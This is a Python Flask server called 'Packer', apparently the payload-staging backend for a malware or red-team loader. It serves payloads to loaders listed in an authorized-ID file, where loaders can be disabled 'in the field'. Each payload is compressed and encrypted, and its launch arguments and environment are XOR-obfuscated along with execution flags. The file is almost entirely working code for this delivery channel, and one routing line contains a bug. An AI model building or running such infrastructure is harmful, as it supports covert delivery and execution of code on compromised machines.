'''
This file is meant to hold the core Packer mechanisms

This runs a HTTPS server using the REST API
There are two methods of using the API

The default:
Access <ip>:<port>/api/<id>

<ip>: the IP of the server
<port>: the port of this application
<id>: the ID of the loader

This will return a list of payloads available to the loader
To request a particular payload add the following to the api access

?send=<payload>

<payload>: one of the names of the payload returned in the above list

Alternative:
Access <ip>:<port> w/ a Data field

This is to accomodate alternative protocols other than HTTP
The data field of a request should be populated in the following format

"<id>"
"<id> <payload>"

<id>: the ID of the loader
<payload>: one of the names of the payload returned in a payload list

The first format will return the payload list
The second format will return the payload

Example in Python:
import requests

response = requests.get("http://example.org:80", data="test payload-1")
'''
from zlib import compress
from flask import Flask, request, jsonify, current_app
import os, io
import zlib
import nacl.secret, nacl.utils
import numpy as np
import config_with_yaml as config
import sys, getopt
import logging
from logging.handlers import RotatingFileHandler

from flask.helpers import send_file

my_handler = RotatingFileHandler('./logs/packer.log', mode='a', maxBytes=5*1024*1024, 
                                 backupCount=2, encoding=None, delay=0)
log_formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(message)s')
my_handler.setFormatter(log_formatter)
my_handler.setLevel(logging.INFO)

app_log = logging.getLogger('root')
app_log.setLevel(logging.INFO)

app_log.addHandler(my_handler)

'''
Generating keys via args

Format:

./Packer.py -g -p <password> -o <name of file>
'''

if(len(sys.argv[1:]) > 0):
    password = ""
    outfile = "secret-key"
    generate = False
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hgp:o:",["help", "gen", "pass=","ofile="])
    except:
        print("Correct Usage:\n./Packer.py -g [-p] <password> [-o] <name of file>\nRemember to enclose strings in double quotes\nPasswords will be padded/truncated to 32 bytes")
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print("Correct Usage:\n./Packer.py -g [-p] <password> [-o] <name of file>\nRemember to enclose strings in double quotes\nPasswords will be padded/truncated to 32 bytes")
            sys.exit(0)
        elif opt in ("-g", "--gen"):
            generate = True
        elif opt in ("-p", "--pass"):
            password = arg
        elif opt in ("-o", "--ofile"):
            outfile = arg
    
    if(generate):
        key = ""
        if(password != ""):
            if(len(password) > 32):
                key = password[:32]
            elif(len(password) < 32):
                key = password + '#' * (32 - len(password))
            assert(len(key) == 32)
            key = key.encode('utf-8') #convert to bytes
        else:
            #default is 32 bytes
            key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        f = open(outfile, "wb")
        f.write(key)
        f.close()
    sys.exit(0)


app = Flask(__name__)
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

class InvalidUsage(Exception):
    status_code = 400

    def __init__(self, message, status_code=None, payload=None):
        Exception.__init__(self)
        self.message = message
        if status_code is not None:
            self.status_code = status_code
        self.payload = payload

    def to_dict(self):
        rv = dict(self.payload or ())
        rv['message'] = self.message
        return rv

@app.errorhandler(InvalidUsage)
def handle_invalid_usage(error):
    response = jsonify(error.to_dict())
    response.status_code = error.status_code
    return response

@app.route('/')
def dataroute():
    #this is for various other types of communicating with the packer
    #such as through DNS, the format of the data field should be this
    #<id> <payload>
    data_field = request.get_data(cache=False, as_text=True)
    
    args = data_field.split(' ')
    if len(args) == 0 or len(args) > 3:
        return ('', 204)
    if len(args) == 1:
        args.append('')
        args.append('')
    if len(args == 2):
        args.append('')
    return packer(args[0], args[1], args[2])

#This is the api used when the loader 
@app.route('/api/<id>', methods=['GET'])
def apiroute(id):
    return packer(id, '', '')

@app.route('/cli/<arg>')
    #make sure that only local computer can access this admin panel
def cli(arg):
    key = open('cli-secret-key', 'rb').read()
    box = nacl.secret.SecretBox(key)

    auth = False
    try:
        if box.decrypt(request.data) == b"packer-cli":
            auth = True
    except:
        pass
    if request.remote_addr != "127.0.0.1" or not auth:
        raise InvalidUsage(message='This is a restricted server. Your IP has been logged.', status_code=403)

    loader_id = request.args.get('id', '')
    payload_name = request.args.get('payload', '')

    available_loaders = next(os.walk('static/'))[1]
    available_payloads = []
    if loader_id != '':
        for dirnames in next(os.walk('static/' + loader_id))[1]:
            available_payloads.append(dirnames)

    if arg == "hello":
        return ("hello", 200)
    elif arg == "authorized":
        with current_app.open_resource('static/authorized-ids.txt') as f:
            authorized_ids: str = []
            for ids in f:
                authorized_ids.append(ids.strip().decode())
        return jsonify(authorized_ids)
    elif arg == "available":
        return jsonify(next(os.walk('static/'))[1])
    elif arg == "online":
        return ("To be implemented")
    elif arg == "payloads":
        if loader_id in available_loaders:
            return (jsonify(available_payloads))
        return ("ID Not Found", 404)
    elif arg == "send":
        if loader_id in available_loaders:
            if payload_name in available_payloads:
                return ("To be implemented")
            else:
                return ("Payload Not Found", 404)
        else:
            return ("ID Not Found", 404)
        
    return ("Invalid Argument", 400)


def packer(id, query, uid):
    #todo: authenticate this api access with use of secret key

    #the reason why we have an authorized-ids.txt is that we may want to
    #disable a loader in the field, but keep payloads ready for future activation
    with current_app.open_resource('static/authorized-ids.txt') as f:
        authorized = False
        for ids in f:
            ids = ids.strip() #remove \n
            if id == ids.decode():
                authorized = True
                break
    if not authorized:
        raise InvalidUsage(message='This is a restricted server. Your IP has been logged.', status_code=403)
    
    #available payloads for a particular loader
    available_payloads = []
    for dirnames in next(os.walk('static/' + id))[1]:
        available_payloads.append(dirnames)
    
    send_arg = request.args.get('send', '')
    if send_arg == '':
        if query != '':
            send_arg = query
        else:
            send_arg = "NO QUERY"
    
    uid_arg = request.args.get('uid', '')
    if uid_arg == '':
        if uid != '':
            uid_arg = uid
        else:
            uid_arg = "NO UID"

    app_log.info(f'{id} | {send_arg} | {uid_arg}')

    #choose a payload 
    if send_arg in available_payloads and send_arg != '':
        try:
            #encryption with PyNacl
            key = open('static/' + id + '/secret-key', 'rb').read()
            box = nacl.secret.SecretBox(key)

            #fileblob will contain all the compressed files
            fileblobs = []
            filemetas = []
            finalblob = bytearray(b'')
            #filemeta will have the following format, original file size . compressed file size . encrypted file size
            #each file compressed and added to the fileblob will have a corresponding filemeta tuple

            argv_files = []
            envp_files = []
            flag_files = []
            payload_files = []
            for (root, _, filenames) in os.walk('static/' + id + '/' + send_arg):
                for filename in filenames:
                    path = os.path.join(root, filename)
                    if filename.endswith(".argv"):
                        argv_files.append(path)
                    elif filename.endswith(".envp"):
                        envp_files.append(path)
                    elif filename.endswith(".flags"):
                        flag_files.append(path)
                    else:
                        payload_files.append(path)
            payload_files.sort()

            for payload in payload_files:
                #we will pack all files contained in the payload folder, no matter what subfolders they may be in
                current_file = open(payload, 'rb').read()
                compressed_file = zlib.compress(current_file, zlib.Z_BEST_COMPRESSION)
                encrypted_file = box.encrypt(compressed_file)

                payload_name = payload.split('.')[0]
                exe_name = payload.split('/')[-1].split('\\')[-1]
                
                argv = []
                envp = []
                flags = []
                flagsum = 0
                try:
                    argv.append(exe_name.encode("utf-8"))
                    argv += open(payload_name + ".argv", 'rb').read().splitlines()
                except:
                    pass
                try:
                    envp = open(payload_name + ".envp", 'rb').read().splitlines()
                except:
                    pass
                try:
                    flags = open(payload_name + ".flags", 'r').read().splitlines()
                    for flag in flags:
                        flagsum += int(flag)
                except:
                    pass
                
                #obfuscating the argv and envp
                obfv_argv = []
                for val in argv: 
                    result = bytearray(b'')
                    for x in val: 
                        result.append(x ^ 0xFE)
                    obfv_argv.append(bytes(result))
                    #''.join([chr(ord(a[i%len(a)]) ^ ord(b[i%(len(b))])) for i in range(max(len(a), len(b)))])

                obfv_envp = []
                for val in envp: 
                    result = bytearray(b'')
                    for x in val: 
                        result.append(x ^ 0xFE)
                    obfv_envp.append(bytes(result))

                filemeta = bytearray(b'')
                #in order to make a 4byte int
                meta = np.empty((6,), dtype=np.int32)
                meta[0] = flagsum
                meta[1] = len(obfv_argv)
                meta[2] = len(obfv_envp)
                meta[3] = len(current_file)
                meta[4] = len(compressed_file)
                meta[5] = len(encrypted_file)

                filemeta.extend(bytes(meta))

                for idx in range(len(obfv_argv)):
                    arglen = np.empty((1,), dtype=np.int32)
                    arglen[0] = len(obfv_argv[idx])
                    filemeta.extend(bytes(arglen))
                    filemeta.extend(obfv_argv[idx])
                    
                for idx in range(len(obfv_envp)):
                    envplen = np.empty((1,), dtype=np.int32)
                    envplen[0] = len(obfv_envp[idx])
                    filemeta.extend(bytes(envplen))
                    filemeta.extend(obfv_envp[idx])

                fileblob = bytearray(b'')
                fileblob.extend(encrypted_file)

                filemetas.append(filemeta)
                fileblobs.append(fileblob)
            
            count = np.empty((1,), dtype=np.int32)
            count[0] = len(fileblobs)

            '''
            First 4 bytes, count of blobs
            Blob meta (as many as there are blobs) -
                4 byte  - (8 boolean flags)
                4 bytes - number of argv
                4 bytes - number of envp
                4 bytes - original size
                4 bytes - compressed size
                4 bytes - encrypted size
                argv data (as many as there are argv)
                    4 bytes - len of arg
                    x bytes - arg
                envp data (as many as there are envp)
                    4 bytes - len of env
                    x bytes - env arg
            Blobs (after all blob metas)
                Raw bytes
            '''

            '''
            Possible boolean flags (1 is set, default is 0)
            0x1 - Hold execution of next execution til this one finishes (default is parallel execution)
            0x2 - Write to disk if non exe, (default is no)
            '''

            finalblob.extend(bytes(count))
            for fm in filemetas:
                finalblob.extend(fm)
            for fb in fileblobs:
                finalblob.extend(fb)
            
            return send_file(io.BytesIO(finalblob), as_attachment=True, attachment_filename="AWAY")
        except Exception as e:
            return str(e)

if __name__ == "__main__":
    #todo change adhoc
    cfg = config.load("config.yml")
    if cfg.getPropertyWithDefault("packer.ssl", False):
        app.run(host = cfg.getPropertyWithDefault("packer.uri", "127.0.0.1"), port = cfg.getPropertyWithDefault("packer.port", "5000"), ssl_context='adhoc')
    else:
        app.run(host = cfg.getPropertyWithDefault("packer.uri", "127.0.0.1"), port = cfg.getPropertyWithDefault("packer.port", "5000"))